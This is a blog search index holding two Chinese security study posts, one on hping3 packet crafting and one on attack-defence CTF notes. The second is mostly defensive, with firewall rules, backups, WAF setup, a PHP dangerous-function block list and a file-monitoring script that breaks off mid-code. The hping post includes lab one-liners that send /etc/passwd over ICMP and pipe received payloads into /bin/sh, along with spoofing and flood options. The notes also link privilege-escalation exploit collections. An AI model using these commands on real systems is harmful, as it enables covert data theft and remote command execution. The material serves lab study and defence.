<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络发包测试</title>
      <link href="2021/study/sec/"/>
      <url>2021/study/sec/</url>
      
        <content type="html"><![CDATA[<h2 id="网络发包测试"><a href="#网络发包测试" class="headerlink" title="网络发包测试"></a>网络发包测试</h2><h3 id="hping发包"><a href="#hping发包" class="headerlink" title="hping发包"></a>hping发包</h3><p>hping可进行防火墙测试，DDoS ，端口扫描等功能。</p><p>命令挺多的，忘记了可以用man查看下，或者查看帮助。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">  -c  --count     发送数据包的数目  -i  --interval  发送数据包间隔的时间 <span class="token punctuation">(</span>uX即X微秒, 例如： -i u1000<span class="token punctuation">)</span>      --fast      等同 -i u10000 <span class="token punctuation">(</span>每秒10个包<span class="token punctuation">)</span>      --faster    等同 -i u1000 <span class="token punctuation">(</span>每秒100个包<span class="token punctuation">)</span>      --flood  尽最快发送数据包，不显示回复。  -n  --numeric   数字化输出，象征性输出主机地址。  -q  --quiet     安静模式  -I  --interface 网卡接口 <span class="token punctuation">(</span>默认路由接口<span class="token punctuation">)</span>  -V  --verbose   详细模式  -D  --debug     调试信息      --beep      对于接收到的每个匹配数据包蜂鸣声提示模式选择  default mode     TCP   // 默认模式是 TCP  -0  --rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。  -1  --icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。  -2  --udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。  -8  --scan       扫描模式 指定扫描对应的端口。                   Example: hping --scan <span class="token number">1</span>-30,70-90 -S www.target.host    // 扫描  -9  --listen     监听模式  IP 模式  -a  --spoof      源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。  --rand-dest      随机目的地址模式。详细使用 <span class="token function">man</span> 命令  --rand-source    随机源地址模式。详细使用 <span class="token function">man</span> 命令  -t  --ttl        ttl <span class="token punctuation">(</span>默认 <span class="token number">64</span><span class="token punctuation">)</span>  //修改 ttl 值  -N  --id         <span class="token function">id</span> <span class="token punctuation">(</span>默认 随机<span class="token punctuation">)</span>  // hping 中的 ID 值，缺省为随机值  -W  --winid      使用win* id字节顺序  //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。  -r  --rel        相对id字段<span class="token punctuation">(</span>估计主机流量<span class="token punctuation">)</span>  //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。  -f  --frag       拆分数据包更多的frag.  <span class="token punctuation">(</span>may pass weak acl<span class="token punctuation">)</span>   //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。  -x  --morefrag   设置更多的分段标志    // 大量碎片，泪滴攻击。  -y  --dontfrag   设置不分段标志    // 发送不可恢复的IP碎片，这可以让你了解更多的MTU <span class="token environment constant">PATH</span> DISCOVERY。  -g  --fragoff    <span class="token builtin class-name">set</span> the fragment offset    // 设置断偏移。  -m  --mtu        设置虚拟最大传输单元, implies --frag <span class="token keyword">if</span> packet size <span class="token operator">></span> mtu    // 设置虚拟MTU值，当大于mtu的时候分段。  -o  --tos        tos字段，缺省0x00  -G  --rroute     记录IP路由，并显示路由缓冲。  --lsrr           松散源路由并记录路由        // 松散源路由  --ssrr           严格源路由并记录路由      // 严格源路由  -H  --ipproto    在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。ICMP 模式  -C  --icmptype   icmp类型<span class="token punctuation">(</span>默认echo请求<span class="token punctuation">)</span>    // ICMP类型，缺省回显请求。  -K  --icmpcode   icmp代号<span class="token punctuation">(</span>默认0<span class="token punctuation">)</span>     // ICMP代码。      --force-icmp 发送所有icmp类型<span class="token punctuation">(</span>默认仅发送支持的类型<span class="token punctuation">)</span>    // 强制ICMP类型。      --icmp-gw    设置ICMP重定向网关地址<span class="token punctuation">(</span>默认0.0.0.0<span class="token punctuation">)</span>    // ICMP重定向      --icmp-ts    等同 --icmp --icmptype <span class="token number">13</span> <span class="token punctuation">(</span>ICMP 时间戳<span class="token punctuation">)</span>            // icmp时间戳      --icmp-addr  等同 --icmp --icmptype <span class="token number">17</span> <span class="token punctuation">(</span>ICMP 地址子网掩码<span class="token punctuation">)</span>  // icmp子网地址      --icmp-help  显示其他icmp选项帮助      // ICMP帮助UDP/TCP 模式  -s  --baseport   base <span class="token builtin class-name">source</span> port             <span class="token punctuation">(</span>default random<span class="token punctuation">)</span>              // 缺省随机源端口  -p  --destport   <span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token operator">&lt;</span>port<span class="token operator">></span> destination port<span class="token punctuation">(</span>default <span class="token number">0</span><span class="token punctuation">)</span> ctrl+z inc/dec    // 缺省随机源端口  -k  --keep       keep still <span class="token builtin class-name">source</span> port      // 保持源端口  -w  --win        winsize <span class="token punctuation">(</span>default <span class="token number">64</span><span class="token punctuation">)</span>        // win的滑动窗口。windows发送字节<span class="token punctuation">(</span>默认64<span class="token punctuation">)</span>  -O  --tcpoff     <span class="token builtin class-name">set</span> fake tcp data offset     <span class="token punctuation">(</span>instead of tcphdrlen / <span class="token number">4</span><span class="token punctuation">)</span>    // 设置伪造tcp数据偏移量<span class="token punctuation">(</span>取代tcp地址长度除4<span class="token punctuation">)</span>  -Q  --seqnum     shows only tcp sequence number        // 仅显示tcp序列号  -b  --badcksum   <span class="token punctuation">(</span>尝试<span class="token punctuation">)</span>发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。  -M  --setseq     设置TCP序列号   -L  --setack     设置TCP的ack   ------------------------------------- <span class="token punctuation">(</span>不是 TCP 的 ACK 标志位<span class="token punctuation">)</span>  -F  --fin        <span class="token builtin class-name">set</span> FIN flag  -S  --syn        <span class="token builtin class-name">set</span> SYN flag  -R  --rst        <span class="token builtin class-name">set</span> RST flag  -P  --push       <span class="token builtin class-name">set</span> PUSH flag  -A  --ack        <span class="token builtin class-name">set</span> ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）  -U  --urg        <span class="token builtin class-name">set</span> URG flag      // 一大堆IP抱头的设置。  -X  --xmas       <span class="token builtin class-name">set</span> X unused flag <span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>  -Y  --ymas       <span class="token builtin class-name">set</span> Y unused flag <span class="token punctuation">(</span>0x80<span class="token punctuation">)</span>  --tcpexitcode    使用last tcp-<span class="token operator">></span> th_flags作为退出码  --tcp-mss        启用具有给定值的TCP MSS选项  --tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptimeCommon //通用设置  -d  --data       data size    <span class="token punctuation">(</span>default is <span class="token number">0</span><span class="token punctuation">)</span>    // 发送数据包大小，缺省是0。  -E  --file       文件数据  -e  --sign       添加“签名”  -j  --dump       转储为十六进制数据包  -J  --print      转储为可打印字符  -B  --safe       启用“安全”协议  -u  --end        告诉你什么时候--file达到EOF并防止倒回  -T  --traceroute traceroute模式<span class="token punctuation">(</span>等同使用 --bind 且--ttl <span class="token number">1</span><span class="token punctuation">)</span>  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳  --tr-no-rtt   不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）ARS packet description <span class="token punctuation">(</span>new, unstable<span class="token punctuation">)</span>  --apd-send       发送APD描述数据包<span class="token punctuation">(</span>参见docs / APD.txt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="发送syn包"><a href="#发送syn包" class="headerlink" title="发送syn包"></a>发送syn包</h4><p>设置两台在相同网段下的虚拟机</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419154452206.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419154743949.png"></p><p>也可以加上随机源IP参数 –rand-source这样源IP就被伪造成随机的了。但真实环境中运营商会检测地址段，不属于地址段的会被丢弃。</p><h4 id="发送UDP包"><a href="#发送UDP包" class="headerlink" title="发送UDP包"></a>发送UDP包</h4><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160313878.png" alt="端口自增从1000开始"></p><h4 id="发送ICMP包"><a href="#发送ICMP包" class="headerlink" title="发送ICMP包"></a>发送ICMP包</h4><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160658964.png" alt="伪造源IP发送ICMP数据包"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419160812432.png" alt="成功接收"></p><h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>发送端：<code>hping3 192.168.74.128 –icmp –sign pass -d 10000 -c 1 —file /etc/passwd</code></p><p>接收端：<code>hping3 --lisetn pass 192.168.74.132 -I eth0 --icmp</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419161614372.png"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>原理还是文件传输，只是接收的时候利用了一个管道符来执行接收文件里面的内容</p><p><code>echo “touch hack.txt” &gt; test.cmd</code></p><p>发送：<code>hping3 192.168.74.128 -p 53 -d 100 -c 1 --udp --sign pass --file ./test.cmd</code></p><p>接收：<code>hping3 192.168.74.132 --listen  pass -I eth0 --udp -p53 | /bin/sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210419163306120.png" alt="命令执行"></p><h3 id="apachebench发包"><a href="#apachebench发包" class="headerlink" title="apachebench发包"></a>apachebench发包</h3><h3 id="僵尸网络搭建"><a href="#僵尸网络搭建" class="headerlink" title="僵尸网络搭建"></a>僵尸网络搭建</h3><blockquote><p>僵尸网络（botnet）是攻击者出于恶意目的，传播僵尸程序控制大量主机，并通过一对多的命令与控制信道所组成的网络</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 数据包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD</title>
      <link href="2021/awd/awd/"/>
      <url>2021/awd/awd/</url>
      
        <content type="html"><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ol><li>一系列脚本</li><li>WAF</li><li>漏洞POC/EXP库</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>一般比赛只给普通权限的用户，需要我们自己提权</p><p>一般需要我们根据kernel版本号找到对应的poc，平时就要注意收集测试一些比较新的提权poc，以备不时之需。</p><blockquote><p><a href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a> ：一个提权exp项目，收集了04年到18年的exp</p><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection">Middleware-Vulnerability-detection</a>CVE、CMS、中间件漏洞检测利用合集</p></blockquote><h2 id="防守技巧"><a href="#防守技巧" class="headerlink" title="防守技巧"></a>防守技巧</h2><h3 id="1-修改密码"><a href="#1-修改密码" class="headerlink" title="1.修改密码"></a>1.修改密码</h3><p>主要包括网站管理员密码，数据库密码，ssh密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 重置mysql密码</span><span class="token comment"># 方法1：用SET PASSWORD命令</span>mysql<span class="token operator">></span> <span class="token builtin class-name">set</span> password <span class="token keyword">for</span> 用户名@localhost <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">'新密码'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 方法2：用mysqladmin</span>mysqladmin -u用户名 -p旧密码 password 新密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-关闭端口"><a href="#2-关闭端口" class="headerlink" title="2.关闭端口"></a>2.关闭端口</h3><p>关闭非必要端口，防止后门连接</p><p>这里可以采用Linux上常用的防火墙软件:<code>iptables</code>     <a href="https://wangchujiang.com/linux-command/c/iptables.html">使用指南</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#开放ssh</span>iptables -A INPUT -p tcp --dport <span class="token number">22</span> -j ACCEPTiptables -A OUTPUT -p tcp --sport <span class="token number">22</span> -j ACCEPT<span class="token comment">#打开80端口</span>iptables -A INPUT -p tcp --dport <span class="token number">80</span> -j ACCEPTiptables -A OUTPUT -p tcp --sport <span class="token number">80</span> -j ACCEPT<span class="token comment">#开启多端口简单用法</span>iptables -A INPUT -p tcp -m multiport --dport <span class="token number">22,80</span>,8080,8081 -j ACCEPT<span class="token comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span>iptables -A INPUT -p tcp -m multiport --dport <span class="token number">8080,8081</span>,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport <span class="token number">8080,8081</span>,8082,12345 -m state --state ESTABLISHED -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>限制ssh登陆，进行访问控制</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptable -t filter -A INPUT -s <span class="token number">123.4</span>.5.6 -p tcp --dport <span class="token number">22</span> -j DROP 　　//禁止从123.4.5.6远程登陆到本机iptables -A INPUT -s <span class="token number">123.4</span>.5.6/24 -p tcp --dport <span class="token number">22</span> -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>限制IP连接数和连接速率</strong></p><p>限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#单个IP的最大连接数为 30</span>iptables -I INPUT -p tcp --dport <span class="token number">80</span> -m connlimit --connlimit-above <span class="token number">30</span> -j REJECT<span class="token comment">#单个IP在60秒内只允许最多新建15个连接</span>iptables -A INPUT -p tcp --dport <span class="token number">80</span> -m recent --name BAD_HTTP_ACCESS --update --seconds <span class="token number">60</span> --hitcount <span class="token number">15</span> -j REJECTiptables -A INPUT -p tcp --dport <span class="token number">80</span> -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT<span class="token comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span>iptables -A INPUT -p tcp --dport <span class="token number">80</span> -m limit --limit <span class="token number">2</span>/s --limit-burst <span class="token number">10</span> -j ACCEPTiptables -A OUTPUT -p tcp --sport <span class="token number">80</span> -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据包简单识别，防止端口复用类的后门或者shell</strong></p><p>假设病毒木马程序通过22，80端口向服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -A OUTPUT -p tcp --sport <span class="token number">22</span> -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport <span class="token number">80</span> -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport <span class="token number">443</span> -m state --state ESTABLISHED -j ACCEP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>限制访问</strong></p><p>如果对方来势太凶，可以限制或者封杀他们的ip段。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptable -t filter -A FORWARD -s <span class="token number">123.4</span>.5.6 -d <span class="token number">123.4</span>.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务<span class="token comment">#封杀123.4.5.6这个IP或者某个ip段</span>iptables -I INPUT -s <span class="token number">123.4</span>.5.6 -j DROPiptables -I INPUT -s <span class="token number">123.4</span>.5.1/24 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-及时备份"><a href="#3-及时备份" class="headerlink" title="3.及时备份"></a>3.及时备份</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#网站</span><span class="token function">tar</span> -zcvf backup.tar.gz /path/web<span class="token function">tar</span> -zcvf backup.tar.gz /var/www/html<span class="token comment">#恢复</span><span class="token function">tar</span> -zxvf backup.tar.gz<span class="token comment">#数据库</span>mysqldump -u 用户名 -p 数据库名 <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> 导出的文件名mysqldump -u user -p database <span class="token operator">></span> /tmp/database_backup.sql<span class="token comment">#还原数据库</span><span class="token comment">#先创建一个要还原的数据库</span>mysql -u user -p database <span class="token operator">&lt;</span> database_backup.sql<span class="token comment">#或者在mysql终端下用source 命令</span><span class="token builtin class-name">source</span> ~/database_backup.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-部署WAF"><a href="#4-部署WAF" class="headerlink" title="4.部署WAF"></a>4.部署WAF</h3><p>一些WAF可能会被check down? 要谨慎使用</p><ol><li><p>准备waf</p></li><li><p>包含waf.php(include or require)</p><ol><li><p>找到CMS/框架通用配置文件进行包含：</p><ul><li>PHPCMS V9：<code>\phpcms\base.php</code></li><li>PHPWIND8.7：<code>\data\sql_config.php</code></li><li>DEDECMS5.7：<code>\data\common.inc.php</code></li><li>DiscuzX2：<code>\config\config_global.php</code></li><li>WordPress：<code>\wp-config.php</code></li><li>Metinfo：<code>\include\head.php</code></li></ul><p>或者在php.ini中设置：</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token constant">auto_prepend_file</span> <span class="token attr-value"><span class="token punctuation">=</span> waf.php路径;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>修改php.ini文件后重启（高权限）:</p><ol><li><p>禁用敏感函数：</p><p>disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</p></li><li><p>自动包含waf：<br><code>auto_prepend_file = waf.php路径;</code></p></li><li><p>如果不能部署waf我们可以简单的写个apache配置文件来禁止PHP执行</p><pre class="line-numbers language-none"><code class="language-none">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot;&gt;Options -ExecCGI -IndexesAllowOverride NoneRemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlRemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlphp_flag engine off&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;deny from all&lt;&#x2F;FilesMatch&gt;&lt;&#x2F;Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol></li><li><p>分析日志文件</p></li></ol><h3 id="5-文件监控"><a href="#5-文件监控" class="headerlink" title="5.文件监控"></a>5.文件监控</h3><ol><li><p>准备一个脚本，监控并删除所有新增文件。</p></li><li><p>发现内存马，直接重启php。</p></li><li><p>若监控脚本无法使用，使用命令定期查看新增与修改文件。</p></li><li><p>find web路径 -ctime -1 （查看最近一日新增的文件，是否可疑）</p></li><li><p>若权限够高可以设置目录权限</p></li><li><p>干掉不死马</p><pre class="line-numbers language-none"><code class="language-none">(1).ps auxww|grep shell.php 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了(2).重启php等web服务(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。(4).创建一个和不死马生成的马一样名字的文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#use: python file_check.py ./</span><span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> shutil<span class="token keyword">import</span> ntpath<span class="token keyword">import</span> timeCWD <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>FILE_MD5_DICT <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>      <span class="token comment"># 文件MD5字典</span>ORIGIN_FILE_LIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 特殊文件路径字符串</span>Special_path_str <span class="token operator">=</span> <span class="token string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span>bakstring <span class="token operator">=</span> <span class="token string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span>logstring <span class="token operator">=</span> <span class="token string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span>webshellstring <span class="token operator">=</span> <span class="token string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span>difffile <span class="token operator">=</span> <span class="token string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span>Special_string <span class="token operator">=</span> <span class="token string">'drops_log'</span>  <span class="token comment"># 免死金牌</span>UNICODE_ENCODING <span class="token operator">=</span> <span class="token string">"utf-8"</span>INVALID_UNICODE_CHAR_FORMAT <span class="token operator">=</span> <span class="token string">r"\?%02x"</span><span class="token comment"># 文件路径字典</span>spec_base_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>CWD<span class="token punctuation">,</span> Special_path_str<span class="token punctuation">)</span><span class="token punctuation">)</span>Special_path <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'bak'</span> <span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>spec_base_path<span class="token punctuation">,</span> bakstring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'log'</span> <span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>spec_base_path<span class="token punctuation">,</span> logstring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'webshell'</span> <span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>spec_base_path<span class="token punctuation">,</span> webshellstring<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'difffile'</span> <span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>spec_base_path<span class="token punctuation">,</span> difffile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">isListLike</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 获取Unicode编码</span><span class="token keyword">def</span> <span class="token function">getUnicode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> noneToNull<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> noneToNull <span class="token keyword">and</span> value <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> NULL    <span class="token keyword">if</span> isListLike<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>getUnicode<span class="token punctuation">(</span>_<span class="token punctuation">,</span> encoding<span class="token punctuation">,</span> noneToNull<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> value<span class="token punctuation">)</span>        <span class="token keyword">return</span> value    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> value    <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> encoding <span class="token keyword">or</span> UNICODE_ENCODING<span class="token punctuation">)</span>            <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">,</span> ex<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> UNICODE_ENCODING<span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    value <span class="token operator">=</span> value<span class="token punctuation">[</span><span class="token punctuation">:</span>ex<span class="token punctuation">.</span>start<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>INVALID_UNICODE_CHAR_FORMAT <span class="token operator">%</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> value<span class="token punctuation">[</span>ex<span class="token punctuation">.</span>start<span class="token punctuation">:</span>ex<span class="token punctuation">.</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> value<span class="token punctuation">[</span>ex<span class="token punctuation">.</span>end<span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"ignore"</span><span class="token punctuation">)</span><span class="token comment"># 目录创建</span><span class="token keyword">def</span> <span class="token function">mkdir_p</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> errno    <span class="token keyword">try</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">except</span> OSError <span class="token keyword">as</span> exc<span class="token punctuation">:</span>        <span class="token keyword">if</span> exc<span class="token punctuation">.</span>errno <span class="token operator">==</span> errno<span class="token punctuation">.</span>EEXIST <span class="token keyword">and</span> os<span class="token punctuation">.</span>path<span 